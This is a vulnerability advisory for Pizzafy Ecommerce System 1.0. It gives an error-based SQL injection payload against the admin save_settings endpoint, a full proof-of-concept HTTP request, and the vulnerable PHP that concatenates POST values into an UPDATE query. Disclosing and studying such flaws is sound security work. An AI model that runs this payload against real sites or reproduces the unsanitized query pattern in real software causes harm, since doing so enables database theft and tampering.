# Pizzafy Ecommerce System 1.0

**Vulnerability Type:** SQL Injection (Error Based) - SAVE SETTINGS  
**Severity:** HIGH  

**Link to Download:** https://www.sourcecodester.com/php/18708/pizzafy-ecommerce-system.html

## Vulnerable Endpoint
`pizzafy/admin/ajax.php?action=save_settings`

## SQL Injection Query
```sql
name=Test', name = extractvalue(1, concat(0x7e, database())) --

# Proof of Concept (PoC) Request
POST /pizzafy/admin/ajax.php?action=save_settings HTTP/1.1
Host: localhost
Content-Length: 1122
sec-ch-ua: 
Accept: */*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryMCQk8kVG7lc51OEW
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
sec-ch-ua-platform: ""
Origin: http://localhost
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/pizzafy/admin/index.php?page=site_settings
Accept-Encoding: gzip, deflate
Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: __SRMS__logged=2; __SRMS__key=206b8e5962b2c723e98fba4bbeec7eaaec379ecee8f8d585d60cb304bf6d87ec; PHPSESSID=v5klkc7q4o4ffuepoqt6omo11d
Connection: close

------WebKitFormBoundaryMCQk8kVG7lc51OEW
Content-Disposition: form-data; name="name"

name=Test', name = extractvalue(1, concat(0x7e, database())) -- 
------WebKitFormBoundaryMCQk8kVG7lc51OEW
Content-Disposition: form-data; name="email"

info@pizzafy.com
------WebKitFormBoundaryMCQk8kVG7lc51OEW
Content-Disposition: form-data; name="contact"

0912654789
------WebKitFormBoundaryMCQk8kVG7lc51OEW
Content-Disposition: form-data; name="about"

<h1 style="margin-bottom: 0px; padding: 0px; line-height: 90px; color: rgb(0, 0, 0); text-align: center; font-size: 70px; font-family: DauphinPlain;">Pizzafy</h1><h4 style="text-align: center; margin: 10px 10px 5px; padding: 0px; font-size: 14px; line-height: 18px; font-style: italic;" open="" sans", arial, sans-serif;"=""><span style="font-size: 14px; text-align: left;"><font color="#000000">This is Pizzafy E-commerce.</font></span></h4><p></p><p></p><p></p><p></p>
------WebKitFormBoundaryMCQk8kVG7lc51OEW
Content-Disposition: form-data; name="img"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundaryMCQk8kVG7lc51OEW--

# Description
An error-based SQL Injection vulnerability has been identified in the UPDATE functionalities of Pizzafy Ecommerce System 1.0. The issue arises due to improper sanitization of the name parameter, which allows an attacker to inject malicious SQL statements into backend database queries. This can lead to unauthorized data access, data manipulation, or disclosure of sensitive information through database error messages.

# Attack Technique
This attack leverages an error-based SQL injection technique, in which the attacker uses database functions to deliberately trigger errors that reveal sensitive information. When the application returns detailed database error messages, an attacker can:

Enumerate database names, table structures, and column details

Extract sensitive data such as usernames and password hashes

Modify or delete critical records within the database

Potentially escalate privileges by retrieving and abusing session-related data

# Vulnerable Code
public function save_settings() {
    extract($_POST);
    
    if(!isset($_SESSION['login_id'])) {
        return 2;
    }
    
    $qry = $this->conn->query("SELECT * FROM system_settings WHERE id = 1");
    $current = $qry->fetch_assoc();
    
    $cover_img = $current['cover_img'];
    if(isset($_FILES['img']) && $_FILES['img']['tmp_name'] != '') {
        $target_dir = "../assets/img/";
        $file_name = $_FILES['img']['name'];
        $target_file = $target_dir . $file_name;
        
        // Upload code...
    }
    
    $data = " name = '$name' ";
    $data .= ", email = '$email' ";
    $data .= ", contact = '$contact' ";
    $data .= ", about_content = '$about' ";
    $data .= ", cover_img = '$cover_img' ";
    
    $update = $this->conn->query("UPDATE system_settings SET $data WHERE id = 1");

    if (!$update) {
        return $this->conn->error;
    }
    
    if($update) {
        $_SESSION['setting_name'] = $name;
        $_SESSION['setting_email'] = $email;
        $_SESSION['setting_contact'] = $contact;
        $_SESSION['setting_about'] = $about;
        $_SESSION['setting_cover_img'] = $cover_img;
        
        return 1;
    } else {
        return 0;
    }
}

# References
CWE-89: Improper Neutralization of Special Elements used in an SQL Command

